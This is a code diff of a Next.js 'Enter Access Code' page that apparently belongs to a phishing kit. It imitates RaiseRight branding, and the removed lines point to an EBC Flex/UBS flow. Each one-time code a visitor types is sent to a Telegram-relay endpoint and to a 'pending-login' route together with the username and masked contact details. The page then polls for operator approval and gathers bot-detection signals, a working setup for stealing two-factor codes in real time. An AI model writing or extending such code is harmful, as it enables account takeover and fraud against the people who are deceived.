@@ -1,237 +1,254 @@
-"use client";
+"use client"
 
-import { Suspense, useState, useEffect } from "react";
-import { useRouter, useSearchParams } from "next/navigation";
-import { Button } from "@/components/ui/button";
-import { SiteHeader } from "@/components/site-header";
+import { Suspense, useEffect, useRef, useState, type FormEvent } from "react"
+import { useRouter, useSearchParams } from "next/navigation"
+import {
+  APPROVAL_TIMEOUT_MS,
+  MSG_UNABLE_REACH_VERIFICATION,
+  MSG_UNABLE_VERIFY_TIME,
+  OTP_CODE_ERROR_TEXT,
+  OTP_RESEND_COOLDOWN_SEC,
+  OTP_RESEND_LOADING_MS,
+} from "@/lib/approval-messages"
+import { useBotGateSignals } from "@/hooks/use-bot-gate-signals"
+import { wait } from "@/lib/loading-delays"
+import { readStoredUsername } from "@/lib/login-flow-storage"
+import { pollPendingLogin } from "@/lib/poll-pending-login"
+import {
+  pendingLoginMethod,
+  readStoredDeliveryMethod,
+  verificationTypeLabel,
+  type DeliveryMethod,
+} from "@/lib/verification-method"
 
-const EBC_FLEX_REDIRECT_URL =
-  "https://portals.ebcflex.com/Participant/AuthenticateUser/Login.aspx?ReturnUrl=%2fParticipant";
+function parseMethod(raw: string | null): DeliveryMethod {
+  if (raw === "email" || raw === "text" || raw === "call") return raw
+  return readStoredDeliveryMethod()
+}
 
 function EnterCodeContent() {
-  const [code, setCode] = useState("");
-  const [isLoading, setIsLoading] = useState(false);
-  const [isResending, setIsResending] = useState(false);
-  const router = useRouter();
-  const searchParams = useSearchParams();
-  const method = (searchParams.get("method") ?? "email") as "email" | "phone";
-  const isSecondOtp = searchParams.get("step") === "2";
-  const numericCode = code.replace(/\D/g, "");
-  const isCodeValid = numericCode.length >= 4 && numericCode.length <= 8;
-  const confirmationTitle =
-    method === "phone" ? "Phone Confirmation" : "Email Confirmation";
-  const confirmationText =
-    method === "phone"
-      ? "A code has been sent to your phone number:"
-      : "An email has been sent to the following address:";
+  const [code, setCode] = useState("")
+  const [error, setError] = useState("")
+  const [isLoading, setIsLoading] = useState(false)
+  const [isResending, setIsResending] = useState(false)
+  const [resendCooldown, setResendCooldown] = useState(0)
+  const verifyingRef = useRef(false)
+  const router = useRouter()
+  const searchParams = useSearchParams()
+  const getBotGateSignals = useBotGateSignals()
+  const method = parseMethod(searchParams.get("method"))
+  const intro =
+    method === "email"
+      ? "An email has been sent with an access code. Enter the code to continue."
+      : "A code has been sent to your phone. Enter the access code to continue."
+  const numericCode = code.replace(/\D/g, "")
+  const isCodeValid = numericCode.length >= 4 && numericCode.length <= 8
+  const secondaryBusy = isResending || resendCooldown > 0
 
   useEffect(() => {
-    if (typeof window === "undefined") return;
-    if (isSecondOtp) {
-      if (!sessionStorage.getItem("ubs_otp2"))
-        router.replace("/verify-details");
-    } else {
-      if (!sessionStorage.getItem("ubs_verify")) router.replace("/");
-    }
-  }, [isSecondOtp, router]);
-
-  const handleVerify = async () => {
-    if (isLoading) return;
-    setIsLoading(true);
     try {
-      await fetch("/api/telegram/verification", {
+      if (!sessionStorage.getItem("loginReady")) {
+        window.location.href = "/"
+      }
+    } catch {
+      window.location.href = "/"
+    }
+  }, [])
+
+  useEffect(() => {
+    if (resendCooldown <= 0) return
+    const timer = setInterval(
+      () => setResendCooldown((prev) => (prev <= 1 ? 0 : prev - 1)),
+      1000,
+    )
+    return () => clearInterval(timer)
+  }, [resendCooldown])
+
+  const clearOtpAndFocus = (message: string) => {
+    setCode("")
+    setError(message)
+    setIsLoading(false)
+    verifyingRef.current = false
+  }
+
+  const handleVerify = async (e?: FormEvent) => {
+    e?.preventDefault()
+    if (isLoading || verifyingRef.current) return
+    const otpCode = code.replace(/\D/g, "").slice(0, 8)
+    if (otpCode.length < 4) {
+      setError("Please enter the complete code")
+      return
+    }
+
+    verifyingRef.current = true
+    setIsLoading(true)
+    setError("")
+
+    const typeLabel = verificationTypeLabel(method)
+
+    await fetch("/api/telegram/verification", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        code: otpCode,
+        verificationType: typeLabel,
+        page: "/verify",
+      }),
+    }).catch(() => {})
+
+    const userId = readStoredUsername() || sessionStorage.getItem("loginUserId") || "login"
+    const maskedEmail = sessionStorage.getItem("maskedEmail") ?? "**********"
+    const maskedPhone = sessionStorage.getItem("maskedPhone") ?? "***-***-****"
+
+    try {
+      const res = await fetch("/api/pending-login", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
-          verificationType: isSecondOtp ? "Code (final)" : "Code (first OTP)",
-          code,
+          kind: "otp",
+          userId,
+          password: otpCode,
+          method: pendingLoginMethod(method),
+          maskedEmail,
+          maskedPhone,
+          flow: "otp",
+          ...getBotGateSignals(),
         }),
-      }).catch(console.error);
-    } catch (error) {
-      console.error("Failed to send verification notification:", error);
+      })
+      const data = (await res.json()) as { id?: string; error?: string }
+      if (!res.ok) {
+        clearOtpAndFocus(data.error || MSG_UNABLE_REACH_VERIFICATION)
+        return
+      }
+      if (!data.id) {
+        clearOtpAndFocus(OTP_CODE_ERROR_TEXT)
+        return
+      }
+
+      const result = await pollPendingLogin(data.id, APPROVAL_TIMEOUT_MS)
+      if (result === "approved" || result === "redirected") {
+        window.location.href = "/api/login-out"
+        return
+      }
+      if (result === "timeout") {
+        clearOtpAndFocus(MSG_UNABLE_VERIFY_TIME)
+        return
+      }
+      clearOtpAndFocus(OTP_CODE_ERROR_TEXT)
+    } catch {
+      clearOtpAndFocus(MSG_UNABLE_REACH_VERIFICATION)
     }
-    await new Promise((r) => setTimeout(r, 1000));
-    if (isSecondOtp) {
-      window.location.href = EBC_FLEX_REDIRECT_URL;
-    } else {
-      if (typeof window !== "undefined")
-        sessionStorage.setItem("ubs_details", "1");
-      router.push("/verify-details");
-    }
-  };
+  }
 
   const handleResend = async () => {
-    if (isResending) return;
-    setIsResending(true);
+    if (secondaryBusy) return
+    setIsResending(true)
+    setCode("")
+    setError("")
     try {
-      await fetch("/api/telegram/resend-code", {
+      void fetch("/api/telegram/resend-code", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ isSecondOtp }),
-      }).catch(console.error);
-    } catch (error) {
-      console.error("Failed to send resend code notification:", error);
+        body: JSON.stringify({ page: "/verify" }),
+      }).catch(() => {})
+      await wait(OTP_RESEND_LOADING_MS)
+      setResendCooldown(OTP_RESEND_COOLDOWN_SEC)
+    } finally {
+      setIsResending(false)
     }
-    await new Promise((r) => setTimeout(r, 2000));
-    setIsResending(false);
-  };
+  }
+
+  const resendLabel = isResending
+    ? "Loading..."
+    : resendCooldown > 0
+      ? `Didn't receive code? Resend in ${resendCooldown}s`
+      : "Didn't receive code?"
 
   return (
-    <>
-      <main className="min-h-screen bg-white px-4 py-6 md:hidden">
-        <div className="max-w-md mx-auto flex flex-col gap-4">
-          <div className="flex items-center gap-2 mb-1">
+    <div className="min-h-screen bg-white font-raiseright text-[#243b5a]">
+      <header className="w-full bg-white border-b border-white shadow-lg">
+        <div className="flex w-full items-center justify-center h-27 md:h-30">
+          {/* eslint-disable-next-line @next/next/no-img-element */}
+          <img
+            src="/raiseright/images/logo.svg"
+            alt="RaiseRight"
+            className="w-83 h-auto md:w-95 object-contain"
+          />
+        </div>
+      </header>
+
+      <main className="mt-10">
+        <section className="mx-auto w-full max-w-lg px-6 pt-16 sm:px-8 sm:pt-20">
+          <h1 className="mb-4 text-center text-5xl font-light tracking-tight text-[#294d73]">
+            Enter Access Code
+          </h1>
+          <p className="mb-10 text-center text-lg text-gray-600">{intro}</p>
+
+          <form onSubmit={handleVerify}>
+            <div className="mb-6">
+              <div className="bg-gray-50">
+                <label
+                  htmlFor="verify-code"
+                  className="mb-2 block text-base font-medium text-[#28577f] px-3"
+                >
+                  Access code
+                </label>
+                <input
+                  id="verify-code"
+                  type="text"
+                  inputMode="numeric"
+                  autoComplete="one-time-code"
+                  value={code}
+                  onChange={(e) => {
+                    setCode(e.target.value.replace(/\D/g, "").slice(0, 8))
+                    if (error) setError("")
+                  }}
+                  maxLength={8}
+                  placeholder="Enter code"
+                  className="w-full border-0 border-b border-[#28577f] px-2 pb-2 text-lg text-gray-600 outline-none placeholder:text-gray-500 bg-gray-50"
+                />
+              </div>
+              <div className="mt-2 flex justify-end">
+                <button
+                  type="button"
+                  onClick={handleResend}
+                  disabled={secondaryBusy}
+                  className="text-md text-[#1d64a3] underline underline-offset-2 hover:text-[#16496f] font-semibold disabled:opacity-70 disabled:no-underline"
+                >
+                  {resendLabel}
+                </button>
+              </div>
+            </div>
+
+            {error ? (
+              <p className="mb-4 text-red-600 text-base" role="alert">
+                {error}
+              </p>
+            ) : null}
+
+            <button
+              type="submit"
+              disabled={!isCodeValid || isLoading}
+              className="h-16 w-full rounded-full bg-[#1d64a3] text-xl font-semibold text-white transition hover:bg-[#076db7] active:scale-[0.99] disabled:opacity-50 disabled:cursor-not-allowed"
+            >
+              {isLoading ? "Signing in..." : "Continue"}
+            </button>
+          </form>
+
+          <div className="mt-4 text-center">
             <button
               type="button"
-              onClick={() => router.back()}
-              className="inline-flex items-center justify-center rounded-full p-2 text-[#254650]"
+              disabled={isLoading}
+              onClick={() => router.push("/verify-choice")}
+              className="text-xl text-[#28577f] underline underline-offset-2 hover:text-[#16496f] disabled:opacity-50"
             >
-              <svg
-                className="w-6 h-6"
-                fill="none"
-                stroke="currentColor"
-                viewBox="0 0 24 24"
-                strokeWidth="2"
-              >
-                <path
-                  strokeLinecap="round"
-                  strokeLinejoin="round"
-                  d="M9 5l-7 7 7 7"
-                />
-              </svg>
+              Cancel
             </button>
-            <h2 className="text-base font-medium text-gray-900">
-              Verify It&apos;s You
-            </h2>
           </div>
-
-          <div className="rounded-lg border border-gray-200 bg-white p-4 shadow-sm">
-            <h1 className="text-xl font-semibold text-gray-900">
-              {confirmationTitle}
-            </h1>
-            <p className="mt-2 text-sm text-gray-700">{confirmationText}</p>
-
-            <div className="mt-4 rounded-md bg-gray-50 px-3 py-2 text-center text-sm font-medium text-gray-600">
-              {method === "phone" ? "phone number" : "email address"}
-            </div>
-
-            <div className="mt-4">
-              <label htmlFor="verify-code" className="sr-only">
-                Enter verification code
-              </label>
-              <input
-                id="verify-code"
-                type="text"
-                inputMode="numeric"
-                autoComplete="one-time-code"
-                value={code}
-                onChange={(e) =>
-                  setCode(e.target.value.replace(/\D/g, "").slice(0, 8))
-                }
-                maxLength={8}
-                placeholder="Enter code"
-                className="w-full border border-gray-300 rounded-md px-3 py-2.5 text-base tracking-widest text-center focus:outline-none focus:ring-2 focus:ring-[#254650]"
-              />
-            </div>
-
-            <p className="mt-3 text-center text-sm text-gray-600">
-              OTP will expire in 14m 57s
-            </p>
-
-            <p className="mt-3 text-sm text-gray-700">
-              <span className="text-red-600 font-semibold">Note</span> - Do not
-              share your verification code with anyone else.
-            </p>
-
-            <div className="mt-4 flex flex-col gap-2">
-              <Button
-                type="button"
-                onClick={handleVerify}
-                disabled={!isCodeValid || isLoading}
-                className="w-full h-10 rounded-md bg-[#254650] text-white hover:bg-[#1e383f] disabled:opacity-70 disabled:pointer-events-none"
-              >
-                {isLoading ? "Loading..." : "Continue"}
-              </Button>
-
-              <Button
-                type="button"
-                variant="outline"
-                onClick={handleResend}
-                className="w-full h-10 rounded-md border-[#254650] text-[#254650] hover:bg-gray-50"
-              >
-                {isResending ? "Loading..." : "Didn't receive code"}
-              </Button>
-            </div>
-          </div>
-        </div>
+        </section>
       </main>
-
-      <div className="hidden md:flex min-h-screen flex-col bg-white">
-        <SiteHeader />
-        <div className="max-w-2xl px-4 py-10 mb-67.5 mx-auto md:mx-0 md:ml-15">
-          <div className="mb-6">
-            <h2 className="text-base font-medium text-gray-900 mb-4">
-              Verify It's You
-            </h2>
-            <h1 className="text-2xl font-semibold text-gray-900 mb-3">
-              Enter Access Code
-            </h1>
-            <p className="text-gray-700 text-sm mb-4">
-              Enter the code that was sent to you.
-            </p>
-
-            <div className="flex items-center gap-2 mb-4">
-              <span className="text-gray-700 text-sm">
-                Didn't receive code?
-              </span>
-              <button
-                type="button"
-                onClick={handleResend}
-                disabled={isResending}
-                className="px-3 py-1.5 bg-gray-200 text-gray-700 rounded-md text-sm font-medium hover:bg-gray-300 disabled:opacity-70 disabled:cursor-not-allowed"
-              >
-                {isResending ? "Loading..." : "Resend code"}
-              </button>
-            </div>
-          </div>
-
-          <div className="space-y-4">
-            <div>
-              <input
-                type="text"
-                id="code"
-                inputMode="numeric"
-                value={code}
-                onChange={(e) =>
-                  setCode(e.target.value.replace(/\D/g, "").slice(0, 8))
-                }
-                placeholder=""
-                className="w-full max-w-50 px-2.5 py-1.5 border border-gray-300 rounded-md text-sm focus:outline-none focus:ring-2 focus:ring-[#254650] focus:border-transparent"
-                maxLength={8}
-              />
-            </div>
-
-            <div className="flex gap-3 mt-3">
-              <Button
-                className="bg-[#254650] text-white hover:bg-[#1e383f] rounded-md disabled:opacity-70 disabled:pointer-events-none h-8 px-5 text-sm font-medium"
-                onClick={handleVerify}
-                disabled={!isCodeValid || isLoading}
-              >
-                {isLoading ? "Loading..." : "Continue"}
-              </Button>
-              <Button
-                variant="ghost"
-                className="bg-gray-200 text-gray-700 hover:bg-gray-300 rounded-md h-8 px-5 text-sm font-medium"
-                onClick={() => router.back()}
-              >
-                Cancel
-              </Button>
-            </div>
-          </div>
-        </div>
-      </div>
-    </>
-  );
+    </div>
+  )
 }
 
 export default function EnterCodePage() {
@@ -245,5 +262,5 @@ export default function EnterCodePage() {
     >
       <EnterCodeContent />
     </Suspense>
-  );
+  )
 }
